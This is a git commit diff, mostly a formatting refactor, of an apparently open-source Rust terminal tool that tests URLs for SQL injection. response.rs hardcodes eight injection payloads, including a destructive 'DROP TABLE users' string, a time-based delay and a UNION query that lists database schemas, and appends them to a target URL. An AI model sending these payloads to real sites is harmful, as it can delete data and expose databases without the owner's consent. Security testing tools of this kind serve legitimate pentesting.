50f6d0c6df9eddec67bf1162f9c7051ff20c4a38
João Lucas <joaolucasfp2001@gmail.com>
2025-09-14 22:12:36 -0300

    refactor: improvements code and setup release (#156)

--- src/add_block.rs
+++ src/add_block.rs
@@ -1,37 +1,32 @@
 use ratatui::{
-    layout::Alignment,
-    style::{Color, Style},
-    widgets::{Block, Borders, Paragraph, Wrap},
+	layout::Alignment,
+	style::{Color, Style},
+	widgets::{Block, Borders, Paragraph, Wrap},
 };
 
 pub struct AddBlock;
 
 impl AddBlock {
-    pub fn add_info_text() -> Paragraph<'static> {
-        let text = "🌐 🛢️ Command Line Tools to check for SQL Injection vulnerability.";
+	pub fn add_info_text() -> Paragraph<'static> {
+		let text = "🌐 🛢️ Command Line Tools to check for SQL Injection vulnerability.";
+		Paragraph::new(text)
+			.block(Block::default().borders(Borders::ALL))
+			.style(Style::default().fg(Color::Green))
+	}
 
-        let info_text = Paragraph::new(text)
-            .block(Block::default().borders(Borders::ALL))
-            .style(Style::default().fg(Color::Green));
+	pub fn add_url_block(url: &str) -> Paragraph<'_> {
+		Paragraph::new(url)
+			.block(
+				Block::default()
+					.title("Enter the URL")
+					.borders(Borders::ALL),
+			)
+			.style(Style::default().fg(Color::White))
+			.wrap(Wrap { trim: true })
+	}
 
-        info_text
-    }
-
-    pub fn add_url_block(url: &str) -> Paragraph<'_> {
-        let url_block = Paragraph::new(url)
-            .block(
-                Block::default()
-                    .title("Enter the URL")
-                    .borders(Borders::ALL),
-            )
-            .style(Style::default().fg(Color::White))
-            .wrap(Wrap { trim: true });
-
-        url_block
-    }
-
-    pub fn add_type_payload_text() -> Paragraph<'static> {
-        let text = "\
+	pub fn add_type_payload_text() -> Paragraph<'static> {
+		let text = "\
         \n1 - classical 1\n\
         2 - classical 2\n\
         3 - time-based\n\
@@ -40,44 +35,34 @@ impl AddBlock {
         6 - boolean 1\n\
         7 - boolean 2\n\
         8 - Get Database\n";
+		Paragraph::new(text).style(Style::default().fg(Color::Green))
+	}
 
-        let type_payload_text = Paragraph::new(text).style(Style::default().fg(Color::Green));
-        type_payload_text
-    }
+	pub fn add_payload_block(payload_type: &str) -> Paragraph<'_> {
+		Paragraph::new(payload_type)
+			.block(
+				Block::default()
+					.title("Enter the payload type")
+					.borders(Borders::ALL),
+			)
+			.style(Style::default().fg(Color::White))
+			.wrap(Wrap { trim: true })
+	}
 
-    pub fn add_payload_block(payload_type: &str) -> Paragraph<'_> {
-        let payload_block = Paragraph::new(payload_type)
-            .block(
-                Block::default()
-                    .title("Enter the payload type")
-                    .borders(Borders::all()),
-            )
-            .style(Style::default().fg(Color::White))
-            .wrap(Wrap { trim: true });
+	pub fn add_result_block(result_text: &str) -> Paragraph<'_> {
+		Paragraph::new(result_text)
+			.alignment(Alignment::Center)
+			.block(
+				Block::default()
+					.title("Result")
+					.borders(Borders::TOP)
+					.style(Style::default().fg(Color::Yellow)),
+			)
+			.wrap(Wrap { trim: true })
+	}
 
-        payload_block
-    }
-
-    pub fn add_result_block(result_text: &str) -> Paragraph<'_> {
-        let result_block = Paragraph::new(result_text)
-            .alignment(Alignment::Center)
-            .block(
-                Block::default()
-                    .title("Result")
-                    .borders(Borders::TOP)
-                    .style(Style::default().fg(Color::Yellow)),
-            )
-            .wrap(Wrap { trim: true });
-
-        result_block
-    }
-
-    pub fn add_help_text() -> Paragraph<'static> {
-        let text = "Use TAB to switch between fields. Press ENTER to validate.";
-
-        let help_text = Paragraph::new(text)
-            .style(Style::default().fg(Color::White));
-
-        help_text
-    }
+	pub fn add_help_text() -> Paragraph<'static> {
+		let text = "Use TAB to switch between fields. Press ENTER to validate.";
+		Paragraph::new(text).style(Style::default().fg(Color::White))
+	}
 }
--- src/response.rs
+++ src/response.rs
@@ -1,81 +1,81 @@
-use reqwest::Client;
 use regex::Regex;
+use reqwest::Client;
 use scraper::{Html, Selector};
 
 pub struct Response;
 
 impl Response {
-    pub async fn validation_exist_sql_injection(
-        url: &str,
-        payload: &str) -> Result<String, reqwest::Error> {
-        let client = Client::new();
-        let set_payload = match payload {
-            "1" => "' OR '1'='1",
-            "2" => "'; DROP TABLE users; --",
-            "3" => "'; WAITFOR DELAY '00:00:05'--",
-            "4" => "' AND 1=1 --",
-            "5" => "' AND 1=0 --",
-            "6" => "' OR 1=0 --",
-            "7" => "' OR 1=1 --",
-            "8" => "-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata",
-            _ => return Ok("Option not found".to_string())
-        };
+	pub async fn validation_exist_sql_injection(
+		url: &str,
+		payload: &str,
+	) -> Result<String, reqwest::Error> {
+		let client = Client::new();
+		let set_payload = match payload {
+			"1" => "' OR '1'='1",
+			"2" => "'; DROP TABLE users; --",
+			"3" => "'; WAITFOR DELAY '00:00:05'--",
+			"4" => "' AND 1=1 --",
+			"5" => "' AND 1=0 --",
+			"6" => "' OR 1=0 --",
+			"7" => "' OR 1=1 --",
+			"8" => "-1 union select 1, 2, group_concat(schema_name) from information_schema.schemata",
+			_ => return Ok("Payload option not found".to_string()),
+		};
 
-        Self::response(&client, url, set_payload, payload == "8").await
-    }
+		Self::response(&client, url, set_payload, payload == "8").await
+	}
 
-    async fn response(
-        client: &Client,
-        url: &str,
-        payload: &str,
-        show_body: bool) -> Result<String, reqwest::Error> {
-        let test_url = format!("{}{}", url, payload);
+	async fn response(
+		client: &Client,
+		url: &str,
+		payload: &str,
+		show_body: bool,
+	) -> Result<String, reqwest::Error> {
+		let test_url = format!("{}{}", url, payload);
 
-        let response = client.get(&test_url).send().await?;
+		let response = client.get(&test_url).send().await?;
 
-        if response.status().is_success() {
-            let body = response.text().await?;
+		if response.status().is_success() {
+			let body = response.text().await?;
 
-            if !show_body {
-                match Self::contains_sql_injection(&body) {
-                    Ok(message) => Ok(message),
-                    Err(error) => Ok(error)
-                }
-            } else {
-                match Self::extract_information_schema(&body) {
-                    Ok(message) => Ok(message),
-                    Err(error) => Ok(error)
-                }
-            }
-        } else {
-            Err(response.error_for_status().unwrap_err())
-        }
-    }
+			if !show_body {
+				match Self::contains_sql_injection(&body) {
+					Ok(message) => Ok(message),
+					Err(error) => Ok(error),
+				}
+			} else {
+				match Self::extract_information_schema(&body) {
+					Ok(message) => Ok(message),
+					Err(error) => Ok(error),
+				}
+			}
+		} else {
+			Err(response.error_for_status().unwrap_err())
+		}
+	}
 
-    fn contains_sql_injection(body: &str) -> Result<String, String> {
-        if body.contains("mysql_fetch_array()") || body.contains("SQL syntax") {
-            Ok("✅ Vulnerable to SQL Injection".to_string())
-        } else {
-            Err("❌ No vulnerabilities found".to_string())
-        }
-    }
+	fn contains_sql_injection(body: &str) -> Result<String, String> {
+		if body.contains("mysql_fetch_array()") || body.contains("SQL syntax") {
+			Ok("✅ Vulnerable to SQL Injection".to_string())
+		} else {
+			Err("❌ No vulnerabilities found".to_string())
+		}
+	}
 
-    fn extract_information_schema(html_content: &str) -> Result<String, String> {
-        let document = Html::parse_document(html_content);
-        let selector = Selector::parse("div, p").map_err(|_| "Failed \
-        to parse selector".to_string())?;
+	fn extract_information_schema(html_content: &str) -> Result<String, String> {
+		let document = Html::parse_document(html_content);
+		let selector = Selector::parse("div, p").map_err(|_| "Failed to parse selector".to_string())?;
 
-        let css_regex = Regex::new(r"\{.*?\}").map_err(|_| "Failed to \
-        compile regex".to_string())?;
+		let css_regex = Regex::new(r"\{.*?\}").map_err(|_| "Failed to compile regex".to_string())?;
 
-        for element in document.select(&selector) {
-            let text = element.text().collect::<Vec<_>>().join(" ");
+		for element in document.select(&selector) {
+			let text = element.text().collect::<Vec<_>>().join(" ");
 
-            if text.contains("information_schema") && !css_regex.is_match(&text) {
-                return Ok(text.trim().to_string());
-            }
-        }
+			if text.contains("information_schema") && !css_regex.is_match(&text) {
+				return Ok(text.trim().to_string());
+			}
+		}
 
-        Err("Database not found".to_string())
-    }
+		Err("Database not found".to_string())
+	}
 }
